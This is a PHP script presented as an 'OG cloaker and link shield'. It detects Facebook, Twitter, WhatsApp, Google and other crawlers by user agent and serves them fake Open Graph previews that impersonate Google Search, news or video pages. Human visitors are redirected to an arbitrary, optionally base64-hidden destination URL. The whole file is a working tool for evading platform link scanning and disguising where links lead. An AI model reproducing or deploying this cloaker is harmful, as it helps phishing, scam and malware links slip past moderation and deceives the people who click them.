<?php
/**
 * Shimul King - Advanced Server-Side OG Cloaker & Link Shield
 * Protects links from Facebook, Instagram, Twitter, and WhatsApp detection.
 */

$bot_user_agents = [
    'facebookexternalhit',
    'Facebot',
    'Twitterbot',
    'TelegramBot',
    'WhatsApp',
    'LinkedInBot',
    'Discordbot',
    'SkypeUriPreview',
    'Googlebot',
    'bingbot',
    'Baiduspider',
    'YandexBot'
];

$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$is_bot = false;

foreach ($bot_user_agents as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

// Get destination parameter
$to = isset($_GET['to']) ? $_GET['to'] : (isset($_GET['q']) ? $_GET['q'] : (isset($_GET['url']) ? $_GET['url'] : ''));

if (strpos($to, 'b64:') === 0) {
    $to = base64_decode(substr($to, 4));
} elseif (!preg_match('/^https?:\/\//i', $to) && !empty($to)) {
    $to = 'https://www.google.com/share.google?q=' . urlencode($to);
}

// Preset selection (google, video, news)
$preset = isset($_GET['type']) ? strtolower($_GET['type']) : 'google';

if ($preset === 'video') {
    $og_title = "▶️ [WATCH NOW] Exclusive Full HD Video Stream";
    $og_desc = "Tap to play the high-definition video online. Instant playback.";
    $og_img = "https://kamruzzamanshimul.github.io/LINK-STUDIO/assets/video-preview.jpg";
    $og_site = "HD Streaming Media";
} elseif ($preset === 'news') {
    $og_title = "Breaking News & Global Media Special Report";
    $og_desc = "Verified coverage: Tap to read the complete article and latest updates.";
    $og_img = "https://kamruzzamanshimul.github.io/LINK-STUDIO/assets/news-preview.jpg";
    $og_site = "Global News Media";
} else {
    $og_title = "Google Search - Verified Cloud Results";
    $og_desc = "100% Trusted Google Search Shared Content. Click to view.";
    $og_img = "https://kamruzzamanshimul.github.io/LINK-STUDIO/assets/google-preview.jpg";
    $og_site = "Google Search";
}

// Real Human Visitor -> Immediate Redirection
if (!$is_bot && !empty($to)) {
    header("Location: " . $to, true, 302);
    exit;
}

// Bot / Scraper -> Serve 200 OK Clean Static Open Graph Metadata
http_response_code(200);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title><?php echo htmlspecialchars($og_title); ?></title>
  <meta property="og:type" content="website">
  <meta property="og:site_name" content="<?php echo htmlspecialchars($og_site); ?>">
  <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
  <meta property="og:description" content="<?php echo htmlspecialchars($og_desc); ?>">
  <meta property="og:image" content="<?php echo htmlspecialchars($og_img); ?>">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="<?php echo htmlspecialchars($og_title); ?>">
  <meta name="twitter:description" content="<?php echo htmlspecialchars($og_desc); ?>">
  <meta name="twitter:image" content="<?php echo htmlspecialchars($og_img); ?>">
</head>
<body style="background:#0f1117; color:#fff; font-family:sans-serif; text-align:center; padding:50px;">
  <h2>Verified Safe Content</h2>
  <p>Loading safe preview...</p>
  <?php if (!empty($to)): ?>
    <script>window.location.replace(<?php echo json_encode($to); ?>);</script>
    <a href="<?php echo htmlspecialchars($to); ?>" style="color:#6366f1;">Click here to continue</a>
  <?php endif; ?>
</body>
</html>
